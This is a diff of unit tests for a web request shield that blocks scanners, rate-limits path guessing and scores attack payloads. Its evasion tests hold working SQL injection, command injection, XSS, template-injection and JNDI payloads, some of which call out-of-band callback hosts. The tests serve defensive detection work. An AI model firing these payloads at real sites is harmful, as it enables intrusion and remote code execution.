@@ -845,6 +845,397 @@ class ExemptPaths(unittest.TestCase):
         Config(exempt_paths=["/static", "/healthz/"])
 
 
+SCANNER = {"User-Agent": "sqlmap/1.9"}
+
+
+class Export(unittest.TestCase):
+    """Issue 8: the deny file is what the edge enforces, so it has to be right."""
+
+    def setUp(self):
+        self.dir = tempfile.TemporaryDirectory()
+        self.addCleanup(self.dir.cleanup)
+        self.path = os.path.join(self.dir.name, "deny.conf")
+
+    def read(self):
+        with open(self.path) as f:
+            return f.read()
+
+    def test_workers_sharing_a_file_keep_each_others_blocks(self):
+        a, _ = shield(blocklist_export_path=self.path)            # two worker processes, one file
+        b, _ = shield(blocklist_export_path=self.path)
+        a.check("203.0.113.1", "GET", "/", headers=SCANNER)
+        b.check("203.0.113.2", "GET", "/", headers=SCANNER)
+        a.check("2001:db8::1", "GET", "/", headers=SCANNER)
+        self.assertEqual(self.read(), "deny 2001:db8::/64;\ndeny 203.0.113.1;\ndeny 203.0.113.2;\n")
+
+    def test_expired_blocks_leave_the_file(self):
+        s, c = shield(blocklist_export_path=self.path)
+        s.check("203.0.113.3", "GET", "/", headers=SCANNER)
+        c.t += 1800
+        s.check("203.0.113.4", "GET", "/", headers=SCANNER)
+        self.assertEqual(self.read(), "deny 203.0.113.3;\ndeny 203.0.113.4;\n")
+        c.t += 1801                               # the first block is over; any request notices
+        s.check("198.51.100.5", "GET", "/", headers=BROWSER)
+        self.assertEqual(self.read(), "deny 203.0.113.4;\n")
+        c.t += 1800
+        s.check("198.51.100.5", "GET", "/", headers=BROWSER)
+        self.assertEqual(self.read(), "")
+
+    def test_another_workers_expired_block_leaves_the_file_too(self):
+        a, ca = shield(blocklist_export_path=self.path)
+        b, cb = shield(blocklist_export_path=self.path)
+        a.check("203.0.113.5", "GET", "/", headers=SCANNER)
+        ca.t += 4000
+        cb.t += 4000                              # worker A has gone quiet; B serves the next request
+        b.check("198.51.100.6", "GET", "/", headers=BROWSER)
+        b.check("203.0.113.6", "GET", "/", headers=SCANNER)
+        self.assertEqual(self.read(), "deny 203.0.113.6;\n")
+
+    def test_unblock_leaves_the_file(self):
+        s, _ = shield(blocklist_export_path=self.path)
+        s.check("203.0.113.7", "GET", "/", headers=SCANNER)
+        s.check("203.0.113.8", "GET", "/", headers=SCANNER)
+        self.assertTrue(s.unblock("203.0.113.7"))
+        self.assertEqual(self.read(), "deny 203.0.113.8;\n")
+
+    def test_only_networks_are_written(self):
+        with open(self.path + ".state", "w") as f:                # whatever was left behind
+            f.write('{"invalid": 9999999999, "deny all": 9999999999, "203.0.113.9": "soon", "198.51.100.0/24": 9999999999}')
+        s, _ = shield(blocklist_export_path=self.path)
+        s.check("not-an-address", "GET", "/", headers=SCANNER)
+        s.check("203.0.113.10", "GET", "/", headers=SCANNER)
+        self.assertEqual(self.read(), "deny 198.51.100.0/24;\ndeny 203.0.113.10;\n")
+        with open(self.path + ".state", "w") as f:
+            f.write("not json at all")
+        s.check("203.0.113.11", "GET", "/", headers=SCANNER)
+        self.assertEqual(self.read(), "deny 203.0.113.10;\ndeny 203.0.113.11;\n")
+
+    def test_plain_format_and_return_value(self):
+        s, _ = shield()
+        s.check("203.0.113.12", "GET", "/", headers=SCANNER)
+        self.assertEqual(s.export_blocklist(self.path, "plain"), 1)
+        self.assertEqual(self.read(), "203.0.113.12\n")
+
+    def test_expiry_reaches_the_file_without_another_request(self):
+        s = Shield(Config(mode="enforce", blocklist_export_path=self.path, block_ttl=0.4))    # real clock
+        s.check("203.0.113.13", "GET", "/", headers=SCANNER)
+        self.assertEqual(self.read(), "deny 203.0.113.13;\n")
+        deadline = time.time() + 5
+        while self.read() and time.time() < deadline:
+            time.sleep(0.05)
+        self.assertEqual(self.read(), "")
+
+
+class BlockTable(unittest.TestCase):
+    """Issue 11: blocks are bounded, and changing IPv6 network is not a fresh start."""
+
+    def test_block_table_is_capped(self):
+        s, _ = shield(max_blocks=500, max_tracks=100)
+        for i in range(5000):
+            s.check(f"100.{64 + (i >> 16)}.{(i >> 8) & 255}.{i & 255}", "GET", "/", headers=SCANNER)
+        self.assertLessEqual(len(s._blocks), 500)
+        self.assertLessEqual(len(s.blocklist()), 500)
+        self.assertEqual(s.check("100.64.19.135", "GET", "/", headers=BROWSER).action, "block")    # the latest stays
+        with self.assertRaises(ValueError):
+            Config(max_blocks=0)
+
+    def test_expired_blocks_are_dropped_without_being_asked_for(self):
+        s, c = shield()
+        for i in range(300):
+            s.check(f"100.64.{1 + i // 250}.{i % 250}", "GET", "/", headers=SCANNER)
+        self.assertEqual(len(s._blocks), 300)
+        c.t += 3 * 3600                           # nobody calls blocklist(); those addresses never return
+        s.check("100.64.9.9", "GET", "/", headers=SCANNER)
+        self.assertEqual(len(s._blocks), 1)
+
+    def test_rotating_ipv6_networks_gets_the_wider_prefix_blocked(self):
+        s, c = shield()
+        for i in range(7):
+            s.check(f"2001:db8:5:{i:x}::1", "GET", "/", headers=SCANNER)
+        self.assertEqual(s.check("2001:db8:5:99::7", "GET", "/", headers=BROWSER).action, "pass")   # seven: not yet
+        s.check("2001:db8:5:7::1", "GET", "/", headers=SCANNER)                                    # the eighth
+        self.assertEqual(list(s.blocklist()), ["2001:db8:5::/56"])          # one entry stands for all of them
+        for fresh in ["2001:db8:5:98::7", "2001:db8:5:ff::1", "2001:db8:5:3::2"]:
+            self.assertEqual(s.check(fresh, "GET", "/", headers=BROWSER).action, "block", fresh)
+        self.assertEqual(s.check("2001:db8:5:100::7", "GET", "/", headers=BROWSER).action, "pass")  # the next /56
+        self.assertEqual(s.check("192.0.2.5", "GET", "/", headers=BROWSER).action, "pass")
+        c.t += 3601
+        self.assertEqual(s.check("2001:db8:5:98::7", "GET", "/", headers=BROWSER).action, "pass")
+        self.assertEqual(s.blocklist(), {})
+
+    def test_rotation_across_wider_networks_escalates_again(self):
+        s, _ = shield()
+        for net in range(8):                      # eight /56s, eight /64s in each
+            for i in range(8):
+                s.check(f"2001:db8:6:{net:x}{i:02x}::1", "GET", "/", headers=SCANNER)
+        self.assertEqual(list(s.blocklist()), ["2001:db8:6::/48"])
+        self.assertEqual(s.check("2001:db8:6:f00d::1", "GET", "/", headers=BROWSER).action, "block")
+        self.assertEqual(s.check("2001:db8:7::1", "GET", "/", headers=BROWSER).action, "pass")
+        self.assertTrue(s.unblock("2001:db8:6:f00d::1"))                 # lifting it for one address lifts the prefix
+        self.assertEqual(s.check("2001:db8:6:f00d::1", "GET", "/", headers=BROWSER).action, "pass")
+
+    def test_escalation_can_be_switched_off(self):
+        s, _ = shield(v6_escalate_after=0)
+        for i in range(40):
+            s.check(f"2001:db8:5:{i:x}::1", "GET", "/", headers=SCANNER)
+        self.assertEqual(len(s.blocklist()), 40)
+        self.assertEqual(s.check("2001:db8:5:99::7", "GET", "/", headers=BROWSER).action, "pass")
+
+    def test_neighbours_of_a_few_blocked_networks_are_untouched(self):
+        s, c = shield()
+        for i in range(3):
+            s.check(f"2001:db8:8:{i:x}::1", "GET", "/", headers=SCANNER)
+        for i in range(16, 200):                  # the rest of the street
+            c.t += 1
+            self.assertEqual(s.check(f"2001:db8:8:{i:x}::1", "GET", "/", headers=BROWSER).action, "pass")
+
+
+class History(unittest.TestCase):
+    """Issue 16: a flood limit above 512 used to be silently ignored."""
+
+    def test_large_rate_limit_still_fires(self):
+        s, c = shield(rate_limit=600)
+        hits = []
+        for _ in range(5000):
+            c.t += 0.01
+            hits += s.check("192.0.2.240", "GET", "/", headers=BROWSER).hits
+        self.assertIn("behavior:request-flood", hits)
+
+    def test_limits_must_be_positive(self):
+        for bad in [{"rate_limit": 0}, {"cadence_samples": 1}, {"half_life": 0}, {"enum_404_threshold": 0}]:
+            with self.assertRaises(ValueError, msg=bad):
+                Config(**bad)
+
+
+class Delivery(unittest.TestCase):
+    """Issue 17: logging, the callback and the file write must not hold up other requests."""
+
+    def test_nothing_is_delivered_while_the_lock_is_held(self):
+        free = []
+
+        def probe(where):
+            def try_lock():
+                got = s._lock.acquire(blocking=False)
+                if got:
+                    s._lock.release()
+                free.append((where, got))
+            other = threading.Thread(target=try_lock)
+            other.start()
+            other.join()
+
+        class Handler(logging.Handler):
+            def emit(self, record):
+                probe("log")
+
+        log = logging.getLogger("artex_shield.delivery")
+        log.propagate = False
+        handler = Handler()
+        log.addHandler(handler)
+        self.addCleanup(log.removeHandler, handler)
+        real_replace = os.replace
+
+        def replace(src, dst):
+            probe("export")
+            return real_replace(src, dst)
+
+        with tempfile.TemporaryDirectory() as d:
+            s, c = shield(logger="artex_shield.delivery", on_event=lambda e: probe("callback:" + e["action"]),
+                          blocklist_export_path=os.path.join(d, "deny.conf"))
+            with mock.patch.object(core.os, "replace", replace):
+                s.check("192.0.2.241", "GET", "/.env", headers=BROWSER)              # throttle
+                s.check("203.0.113.100", "GET", "/", headers=SCANNER)               # block, and an export
+                s.check("192.0.2.242", "GET", "/", headers=BROWSER)
+                s.observe("192.0.2.242", "/swagger.json", 404)                      # score, from observe()
+                s.unblock("203.0.113.100")                                           # another export
+        seen = {where for where, _ in free}
+        self.assertTrue({"log", "export", "callback:throttle", "callback:block", "callback:score"} <= seen, seen)
+        self.assertEqual([where for where, got in free if not got], [])
+
+    def test_callback_can_use_the_shield(self):
+        seen = []
+        s, _ = shield(on_event=lambda e: seen.append((e["action"], sorted(s.blocklist()), s.unblock(e["ip"]))))
+        s.check("203.0.113.101", "GET", "/", headers=SCANNER)
+        self.assertEqual(seen, [("block", ["203.0.113.101"], True)])
+        self.assertEqual(s.check("203.0.113.101", "GET", "/", headers=BROWSER).action, "pass")
+
+
+class Evasions(unittest.TestCase):
+    """Issue 9: the usual ways round a payload pattern."""
+
+    def hits(self, query, headers=BROWSER, path="/item"):
+        s, _ = shield()
+        return s.check("203.0.113.110", "GET", path, query, headers).hits
+
+    def test_evasions_are_scored(self):
+        cases = {
+            "payload:sqli": ["id=1/**/UNION/**/SELECT/**/null--", "id=1/*x*/UNION/*y*/ALL/**/SELECT+1",
+                             "id=1+/*!50000UNION*/+/*!50000SELECT*/+1", "id=1%27or%271%27=%271", "id=1%22or%221%22=%221",
+                             "id=1+OR+1=1", "id=1+and+1=2--", "id=1%27+OR+%27a%27=%27a"],
+            "payload:cmdi": ["host=x%0Auname+-a", "host=x%0D%0Awhoami", "host=$(sleep+5)", "host=%60sleep+5%60",
+                             "host=x;sleep+5", "host=x|ls+-la", "host=x%26ping+-c+1+198.51.100.1", "host=%60ls+-la%60",
+                             "host=x%0acat+/tmp/k", "host=$(ls)", "host=x%7C%7Csleep+9"],
+            "payload:xss": ["q=<details+open+ontoggle=alert(1)>", "q=%22+onpointerenter=alert(1)+x=%22",
+                            "q=<svg/onanimationstart=alert(1)>", "q=<body+onpageshow=alert(1)>", "q=<x+onclick=alert(1)>"],
+            "payload:ssti": ["name={{config}}", "name={{7*'7'}}", "name={{+request.application.__globals__+}}",
+                             "name=${T(java.lang.Runtime).getRuntime()}", "name=%23{7*7}", "name={{self}}",
+                             "name={{config.items()}}", "name={{self.__init__.__globals__}}", "name={{request|attr('x')}}"],
+        }
+        for label, queries in cases.items():
+            for q in queries:
+                self.assertIn(label, self.hits(q), q)
+
+    def test_callback_markers_are_found_anywhere_in_the_headers(self):
+        jndi = "${jndi:ldap://c9abc.oast.fun/a}"
+        for name, extra in {"cookie": {"Cookie": "sid=abc123; theme=" + jndi},
+                            "after padding": {"X-Api-Version": "a" * 5000 + jndi},
+                            "last of many": dict({f"X-Pad-{i}": "b" * 3000 for i in range(20)}, **{"X-Trace": jndi}),
+                            "nested lookup in a cookie": {"Cookie": "c=${${::-j}ndi:rmi://198.51.100.1/x}"}}.items():
+            self.assertIn("payload:jndi", self.hits("", dict(BROWSER, **extra)), name)
+        self.assertIn("payload:oob-callback", self.hits("", dict(BROWSER, Cookie="next=//x7.interact.sh/p")))
+
+    def test_ordinary_text_is_still_not_a_payload(self):
+        for q in ["q=cats+and+dogs", "q=rock+and+roll+1999", "q=1+or+2+bedrooms", "filter=price%3D10+or+price%3D20",
+                  "next=%2Flist%3Fonline%3D1%26onsale%3Dtrue", "onclick=track&onchange=1&online=1", "q=only+one=1",
+                  "email=%7B%7Bemail%7D%7D&name=%7B%7B+first_name+%7D%7D", "notes=line+one%0Aline+two%0Aidea+three",
+                  "q=sleep+well+tonight", "q=ping+pong+tables", "path=/usr/local/*.txt&glob=/*/*", "q=a/*b", "c=/*",
+                  "tpl=${name}+${count}", "q=configuration+self+request", "comment=great+product+%231+choice",
+                  "title=War+and+Peace&price=10", "q=ls&sort=id", "tags=shell|bash|ls", "cols=name%0D%0Aid%0D%0Aprice",
+                  "note=shopping%0Acat+food%0Als+the+folder", "q=what+does+%60ls%60+do", "q=use+onclick%3D+in+html",
+                  "q=set+onchange%3Dx", "theme=%7B%7B+settings.theme+%7D%7D", "t=%7B%7B+config.site_name+%7D%7D",
+                  "q=a+%3C+b+onclick%3D1", "q=it%27s+online%3D1"]:
+            self.assertEqual(self.hits(q, path="/search"), [], q)
+        ordinary = dict(BROWSER, Cookie="sid=4f9c2a; _ga=GA1.2.1234.5678; consent=%7B%22ads%22%3Afalse%7D; "
+                                        "last=%2Fsearch%3Fq%3Dsleep%2B(8%2Bhours); cart=3|17|42; lang=en-US")
+        self.assertEqual(self.hits("page=2&id=5", ordinary, "/products"), [])
+
+    def test_headers_are_searched_for_callback_markers_only(self):
+        # A single-page app puts whatever the person typed into the address bar
+        # without asking the server, and every later request repeats it as the
+        # Referer. Text that would score once in a URL must not score there on
+        # every request, so headers are not searched for ordinary payloads.
+        typed = dict(BROWSER, Referer="https://shop.example/search?q=1' UNION SELECT null--", Host="shop.example",
+                     Cookie="last=<script>alert(1)</script>")
+        self.assertEqual(self.hits("", typed), [])
+
+
+class SlowGuessing(unittest.TestCase):
+    """Issue 10: staying under the per-minute limit used to be free for ever."""
+
+    def test_slow_path_guessing_runs_out_of_budget(self):
+        s, c = shield()
+        visit = wsgi_site(s)
+        answers = []
+        for i in range(12 * 60 * 3):              # twelve guesses a minute, for three hours
+            c.t += 5
+            answers.append(visit(f"/guess-{i}"))
+        self.assertEqual(answers[:60], [404] * 60)                # inside the hourly allowance
+        self.assertEqual(answers[-1], 403)
+        self.assertLess(answers.count(404), 200)                  # was all 2,160
+        self.assertIn("192.0.2.200", s.blocklist())
+
+    def test_a_patient_guesser_is_held_to_the_allowance(self):
+        s, c = shield()
+        visit = wsgi_site(s)
+        found = 0
+        for i in range(14 * 60 * 24):             # the old free rate, kept up for a day
+            c.t += 60 / 14
+            found += visit(f"/guess-{i}") == 404
+        self.assertLess(found, 24 * 80)           # was 20,160; now about the allowance, 60 an hour
+
+    def test_dead_links_inside_the_allowance_cost_nothing(self):
+        s, c = shield()
+        visit = wsgi_site(s)
+        for hour in range(6):                     # fifty different dead links an hour, all day
+            for i in range(50):
+                c.t += 72
+                self.assertEqual(visit(f"/old/page-{hour}-{i}"), 404)
+        self.assertEqual(s._tracks["192.0.2.200"].hard, 0)
+        s2, c2 = shield(slow_enum_budget=0)       # and the allowance can be switched off
+        visit2 = wsgi_site(s2)
+        for i in range(300):
+            c2.t += 5
+            self.assertEqual(visit2(f"/guess-{i}"), 404)
+
+    def test_recon_names_are_recognised_below_the_root(self):
+        for path in ["/api/swagger.json", "/api/v1/openapi.json", "/api/graphql", "/app/actuator/env",
+                     "/backend/v2/api-docs", "/blog/wp-login.php", "/tools/phpmyadmin/index.php", "/x/y/swagger-ui/",
+                     "/swagger.json", "/admin/users", "/console", "/metrics", "/debug/vars"]:
+            s, _ = shield()
+            wsgi_site(s)(path)
+            self.assertEqual(s._tracks["192.0.2.200"].hard, 25, path)
+
+    def test_plain_words_are_recon_only_at_the_root(self):
+        s, c = shield()
+        visit = wsgi_site(s)
+        for path in ["/shop/console", "/games/console/ps5", "/blog/admin-tips", "/docs/metrics", "/team/admin",
+                     "/api/metrics-report", "/guides/debug", "/swaggering", "/my-api-docs-notes", "/graphqlx"]:
+            c.t += 30
+            self.assertEqual(visit(path), 404)
+        self.assertEqual(s._tracks["192.0.2.200"].hard, 0)
+
+
+class WebSockets(unittest.TestCase):
+    """Issue 12: a WebSocket handshake is a request like any other."""
+
+    def connect(self, s, ip, path="/ws", query=b"", ua=CHROME, extra=()):
+        reached, sent = [], []
+
+        async def app(scope, receive, send):
+            reached.append(scope["type"])
+            await send({"type": "websocket.accept"})
+
+        async def receive():
+            return {"type": "websocket.connect"}
+
+        async def send(message):
+            sent.append(message)
+
+        scope = {"type": "websocket", "path": path, "query_string": query, "client": (ip, 5555),
+                 "headers": [(b"host", b"shop.example"), (b"user-agent", ua.encode()), (b"accept-language", b"en"),
+                             (b"upgrade", b"websocket")] + list(extra)}
+        asyncio.run(ShieldASGI(app, s)(scope, receive, send))
+        return reached, [m["type"] for m in sent], sent
+
+    def test_blocked_address_cannot_open_a_websocket(self):
+        s, _ = shield()
+        s.check("203.0.113.120", "GET", "/", headers=SCANNER)
+        reached, types, sent = self.connect(s, "203.0.113.120")
+        self.assertEqual((reached, types), ([], ["websocket.close"]))
+        self.assertEqual(sent[0]["code"], 1008)
+
+    def test_handshake_is_scored_like_a_request(self):
+        s, _ = shield()
+        reached, types, _ = self.connect(s, "203.0.113.121", ua="sqlmap/1.9")
+        self.assertEqual((reached, types), ([], ["websocket.close"]))
+        self.assertIn("203.0.113.121", s.blocklist())
+        reached, types, _ = self.connect(s, "203.0.113.122", query=b"room=1%27%20UNION%20SELECT%20null--")
+        self.assertEqual((reached, types), ([], ["websocket.close"]))
+        self.assertEqual(s._tracks["203.0.113.122"].hard, 50)
+
+    def test_ordinary_websocket_goes_through(self):
+        s, _ = shield()
+        own_page = [(b"sec-fetch-site", b"same-origin"), (b"sec-fetch-mode", b"websocket"),
+                    (b"sec-fetch-dest", b"websocket"), (b"origin", b"https://shop.example")]
+        for _ in range(3):
+            reached, types, _ = self.connect(s, "192.0.2.250", query=b"room=7&id=5", extra=own_page)
+            self.assertEqual((reached, types), (["websocket"], ["websocket.accept"]))
+        self.assertIn("192.0.2.250", s._tracks)                   # the site's own script: scored as the visitor's own
+
+    def test_monitor_mode_lets_the_handshake_through(self):
+        s, _ = shield(mode="monitor")
+        reached, types, _ = self.connect(s, "203.0.113.123", ua="sqlmap/1.9")
+        self.assertEqual((reached, types), (["websocket"], ["websocket.accept"]))
+
+    def test_other_scopes_are_passed_on(self):
+        reached = []
+
+        async def app(scope, receive, send):
+            reached.append(scope["type"])
+
+        asyncio.run(ShieldASGI(app, shield()[0])({"type": "lifespan"}, None, None))
+        self.assertEqual(reached, ["lifespan"])
+
+
 class Cost(unittest.TestCase):
     """The shield reads attacker-controlled text on every request, so no input
     may make that slow. Budgets are several times what a linear scan needs."""
@@ -869,7 +1260,8 @@ class Cost(unittest.TestCase):
         self.assertGreaterEqual(len(patterns), 26)
         # Repeated fragments each pattern almost matches: the shape that makes a
         # backtracking engine retry from every position.
-        atoms = ["a", "db", "a-", "a.", "/", " ", "1", "mozilla/5.0 ", "ARTEX-Assessment/1 ", "union ", "union all ",
+        atoms = ["a", "db", "a-", "a.", "/", " ", "\n", "\r\n ", "; ", ";\n", "/*", "/* a ", "*/", "' or ", "{{ ", " on",
+                 " onmouse", "#{1", "${T", "1", "mozilla/5.0 ", "ARTEX-Assessment/1 ", "union ", "union all ",
                  "' ", "' or ", "sleep ( ", "; ", "| cat ", "{{1 ", "${ ", "<%= 1", "on", "onload ", "<svg",
                  "backup.", "/wp-config.php.a", "/swagger/", "/admin/", "x.oast", "-.", "curl/"]
         slow = []
